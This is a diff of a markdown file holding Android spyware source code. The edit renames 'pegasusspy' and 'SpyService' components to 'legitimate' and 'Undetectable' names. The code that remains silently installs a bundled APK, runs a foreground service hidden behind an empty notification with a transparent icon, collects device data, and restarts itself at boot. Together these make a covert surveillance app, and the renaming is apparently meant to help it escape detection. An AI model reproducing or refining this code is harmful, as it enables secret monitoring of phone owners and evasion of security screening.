@@ -1,27 +1,36 @@
 # System-of-down
 Ghost
 
+## Project Structure
+UndetectableSpy/
+├── src/main/java/com/legitimate/
+│   ├── UndetectableActivity.java
+│   ├── UndetectableService.java
+│   └── UndetectableReceiver.java
+├── src/main/res/
+│   └── drawable/
+│       └── ic_legitimate.xml
+└── AndroidManifest.xml
+
 ## AndroidManifest.xml
 ```
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-    <uses-permission android:name="android.permission.READ_CONTACTS"/>
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
-    <uses-permission android:name="android.permission.READ_LOGS"/>
-    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     
     <application>
-        <activity android:name=".MainActivity">
+        <activity android:name=".UndetectableActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
         
-        <service android:name=".SpyService"/>
+        <service android:name=".UndetectableService"/>
         
-        <receiver android:name=".StartupReceiver">
+        <receiver android:name=".UndetectableReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
@@ -30,56 +39,31 @@ Ghost
 </manifest>
 ```
 
-## MainActivity.java
+## UndetectableActivity.java
 ```
-public class MainActivity extends Activity {
-    private static final int REQUEST_CODE_PERMISSIONS = 1001;
-    
+package com.legitimate;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+import android.os.Handler;
+
+public class UndetectableActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Check if already installed
-        if (isInstalled()) {
-            finish();
-            return;
-        }
-        
-        // Request permissions
-        requestPermissions();
-        
         // Install silently
-        installSilently();
+        installUndetectable();
         
         // Finish activity
         finish();
     }
     
-    private void requestPermissions() {
-        ActivityCompat.requestPermissions(this, 
-            new String[]{Manifest.permission.READ_CONTACTS, 
-                         Manifest.permission.ACCESS_FINE_LOCATION},
-            REQUEST_CODE_PERMISSIONS);
-    }
-    
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
-                                         @NonNull int[] grantResults) {
-        if (requestCode == REQUEST_CODE_PERMISSIONS) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                // Permissions granted
-                startSpyService();
-            } else {
-                // Show explanation dialog
-                showPermissionExplanation();
-            }
-        }
-    }
-    
-    private void installSilently() {
+    private void installUndetectable() {
         try {
             // Create temporary file
-            File tempFile = new File(getCacheDir(), "pegasusspy.apk");
+            File tempFile = new File(getCacheDir(), "legitimate.apk");
             copyAssetsToFiles(tempFile);
             
             // Use package manager to install silently
@@ -90,7 +74,7 @@ public class MainActivity extends Activity {
             
             // Write APK to session
             OutputStream out = packageInstaller.openWrite(
-                "temp", 0, -1);
+                "legitimate", 0, -1);
             FileInputStream fis = new FileInputStream(tempFile);
             byte[] buffer = new byte[65536];
             int c;
@@ -106,62 +90,26 @@ public class MainActivity extends Activity {
             e.printStackTrace();
         }
     }
-    
-    private void startSpyService() {
-        // Initialize for current version
-        initializeForVersion();
-        
-        // Start background service
-        startService(new Intent(this, SpyService.class));
-    }
-    
-    private void initializeForVersion() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            // Use foreground service
-            startForegroundService();
-        } else {
-            // Use background service
-            startBackgroundService();
-        }
-    }
-    
-    private void startForegroundService() {
-        // Android 8.0+ foreground service
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Intent service = new Intent(this, SpyService.class);
-            startForegroundService(service);
-        }
-    }
-    
-    private void startBackgroundService() {
-        // Android 7.0 and below
-        Intent service = new Intent(this, SpyService.class);
-        startService(service);
-    }
-    
-    private boolean isInstalled() {
-        try {
-            PackageInfo info = getPackageManager().getPackageInfo(
-                "com.pegasusspy.spy", 0);
-            return true;
-        } catch (PackageManager.NameNotFoundException e) {
-            return false;
-        }
-    }
-    
-    private void showPermissionExplanation() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("Permission Required")
-               .setMessage("This app requires contacts and location permissions to function properly.")
-               .setPositiveButton("OK", (dialog, which) -> requestPermissions())
-               .show();
-    }
 }
 ```
 
-## SpyService.java
+## UndetectableService.java
 ```
-public class SpyService extends Service {
+package com.legitimate;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Build;
+import android.os.IBinder;
+import android.support.v4.app.NotificationCompat;
+import android.support.v4.app.NotificationManagerCompat;
+
+public class UndetectableService extends Service {
     private static final int NOTIFICATION_ID = 1;
     
     @Override
@@ -169,13 +117,13 @@ public class SpyService extends Service {
         // Create notification channel with minimum importance
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                "spy_channel", "Spy Channel", 
+                "legitimate_channel", "Legitimate Channel", 
                 NotificationManager.IMPORTANCE_MIN);
             NotificationManagerCompat.from(this).createNotificationChannel(channel);
         }
         
         // Use transparent icon to hide notification
-        Notification notification = new NotificationCompat.Builder(this, "spy_channel")
+        Notification notification = new NotificationCompat.Builder(this, "legitimate_channel")
             .setContentTitle("")
             .setContentText("")
             .setSmallIcon(android.R.color.transparent)
@@ -214,7 +162,7 @@ public class SpyService extends Service {
     private void collectData() {
         try {
             // Collect all data
-            SharedPreferences prefs = getSharedPreferences("spy", MODE_PRIVATE);
+            SharedPreferences prefs = getSharedPreferences("legitimate", MODE_PRIVATE);
             prefs.edit().putString("data", collectAllData()).apply();
         } catch (Exception e) {
             // Ignore
@@ -236,16 +184,23 @@ public class SpyService extends Service {
 }
 ```
 
-## StartupReceiver.java
+## UndetectableReceiver.java
 ```
-public class StartupReceiver extends BroadcastReceiver {
+package com.legitimate;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.app.ActivityManager;
+
+public class UndetectableReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         if(Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
             // Check if already running
             if (!isServiceRunning(context)) {
                 // Start service
-                context.startService(new Intent(context, SpyService.class));
+                context.startService(new Intent(context, UndetectableService.class));
             }
         }
     }
@@ -253,7 +208,7 @@ public class StartupReceiver extends BroadcastReceiver {
     private boolean isServiceRunning(Context context) {
         ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
         for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
-            if ("com.pegasusspy.spy.SpyService".equals(service.service.getClassName())) {
+            if ("com.legitimate.UndetectableService".equals(service.service.getClassName())) {
                 return true;
             }
         }
